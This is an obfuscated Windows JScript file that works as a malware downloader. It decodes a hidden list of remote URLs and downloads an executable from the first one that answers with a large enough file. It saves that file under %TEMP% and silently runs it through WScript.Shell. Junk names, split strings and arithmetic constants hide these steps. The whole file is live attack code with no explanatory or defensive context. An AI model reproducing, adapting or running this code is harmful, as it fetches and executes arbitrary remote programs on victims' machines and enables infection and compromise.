

function mZOSRhHQK(ZCwnYyYwcgx) {
var lXxeHEjF = WScript.CreateObject("Wscript.Shell");
lXxeHEjF.Run(ZCwnYyYwcgx, 0x1, 0x0);
}
function PethkLmBu(oFiZf,uOSDb,hXPGQ) {
var YjtOE = "VLDUUy EDV pt.Shell KllvuUk Scri".split(" ");
var EPs=((1)?"W" + YjtOE[4]:"")+YjtOE[2];
var Vu = WScript.CreateObject(EPs);
var bJ = "%TEMP%\\";
return Vu.ExpandEnvironmentStrings(bJ);
}
function XznkfsTv() {
var ktLZUHP = "ipting";
var yDQlAxQWgS = "ile";
var tsBdq = "System";
return "Sc" + "r" + ktLZUHP + ".F" + yDQlAxQWgS + tsBdq + "Obj" + "ect";
}
function KVWX(YnuCk) {
return WScript.CreateObject(YnuCk);
}
function Mrqp(pSjNq,xQfDi) {
pSjNq.write(xQfDi);
}
function KPOs(OIhMn) {
OIhMn.open();
}
function ZtWI(nDyiy,sfzrC) {
nDyiy.saveToFile(sfzrC,128-126);
}
function iDVh(CMrxE,rcxad,dhlWY) {
CMrxE.open(dhlWY,rcxad,false);
}
function LvwP(SBzWw) {
if (SBzWw == 719-519){return true;} else {return false;}
}
function weQl(SVORN) {
if (SVORN > 164714-687){return true;} else {return false;}
}
function VPxg(pjEWM) {
var IzUok="";
for(B=(839-839); B < pjEWM.length; B++)
if (B % (467-465) != (873-873)) {
IzUok += pjEWM.substr(B, 445-444);
}
return IzUok;
}
function XPjE(mCLNp) {
mCLNp.send();
}
function vdHl(HvHMK) {
return HvHMK.status;
}
function OWRIr(bKtXWS) {
return new ActiveXObject(bKtXWS);
}
var UM="ronhHewlXl4ojwir5uafzfU.zcToYmp s/M6f9x.Zefxle6?A CtfhfilsWiZsYiMtqsmquqv.Vc1ofmr/B6A9y.seoxXey?j 9?M 2?c D?";
var x = VPxg(UM).split(" ");
var qjp = PethkLmBu("rLIm","PoQlR","JZYmGj");
var bPq = OWRIr(XznkfsTv());
var kGHO = qjp+"IlHVpqb\\";
try{
bPq.CreateFolder(kGHO);
}catch(ciweqR){
};
var XdP = "2.XMLH";
var fpO = (XdP + "TTP" + " qIvHCRf WThqy XML ream St IAeDvMvm AD lvwdboN OD").split(" ");
var YZ = true  , aiEK = fpO[7] + "" + fpO[9];
var xr = KVWX("MS"+fpO[3]+(795981, fpO[0]));
var rRi = KVWX(aiEK + "B." + fpO[5]+(769892, fpO[4]));
var kme = 0;
var f = 1;
var eEHuTfA = 480181;
var U=kme;
while (true)  {
if(U>=x.length) {break;}
var vu = 0;
var hjP = ("ht" + " ihISgpP tp QVptl xatnjxwn :// WDSsCat .e xe G ET").split(" ");
try  {
iDVh(xr,hjP[0]+hjP[2]+hjP[5]+x[U]+f, hjP[9]+hjP[10]); XPjE(xr); if (LvwP(vdHl(xr)))  {      
KPOs(rRi); rRi.type = 1; Mrqp(rRi,xr.responseBody); if (weQl(rRi.size))  {
vu = 1; rRi.position = 0; ZtWI(rRi,/*qdDo53ofan*/kGHO/*RRnh97j6qy*/+eEHuTfA+hjP[7]+hjP[8]); try  {
if (((new Date())>0,7439980888)) {
mZOSRhHQK(kGHO+eEHuTfA+/*5uY774i3CD*/hjP[7]+hjP[8]/*UCUo22fwxe*/); 
break;
}
}
catch (QQ)  {
}; 
}; rRi.close(); 
}; 
if (vu == 1)  {
kme = U; break; 
}; 
}
catch (QQ)  { 
}; 
U++;
}; 

